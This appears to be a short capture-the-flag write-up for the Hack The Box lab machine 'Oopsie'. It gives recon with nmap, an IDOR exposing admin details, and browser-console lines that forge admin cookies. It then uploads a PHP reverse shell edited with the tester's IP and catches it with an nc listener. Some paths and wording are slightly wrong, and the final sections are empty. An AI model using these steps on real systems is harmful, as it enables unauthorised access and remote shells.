## Target: Oopsie
## Platform: HTB
## Date: 06/12/26
## Difficulty: Easy

### Recon 
 
 bash 
 nmap -sC -sV -Pn 10.129.76.27

 Scan found two open ports 
 - 22/tcp ssh (OpenSSH 7.6p1)
 - 80/tcp http (Apache 2.4.29)

 Visited the site and proxied traffic through Burpsuite. Burpsuite's passive sitemap revealed a  hidden login page /cdi-cgi/login, which was not located anywhere on the initial page. 

 Upon visiting the hidden page a login prompt was presented. Clicking the option titled "Login as Guest" under the credential prompt allowed access to a variety of user navigation options. 



### Exploitation

** IDOR + Broken Access Control **

Logged in as a guest. Noticed the URL contained an ID parameter: 
/cdn-cgi/login/admin.php?content=accounts&id=2

Changed id=2 to id=1 - server returned admin details without authorization check

![Admin Details](admin_details.png)

Used Access ID to forge session cookies in browser console

```javascript
document.cookie = "role=admin; path=/" 
document.cookie = "user=34322; path=/"
```

Server accepted session cookies with additional verification -- broken access control. Allowed access to admin-restricted "Uploads" page

**PHP Reverse Shell**

Changed /user/share/webshells/php/php-reverse-shell.php with tun0 ip. Uploaded the shell to the upload page. 

Set up listener:
```bash
nc -lvvp 1234
```

Triggered shell by visiting 

http://10.129.76.27/uploads/php-reverse-shell.php

Caught shell as www-data

---



### Post Exploitation


### Key Takeaway


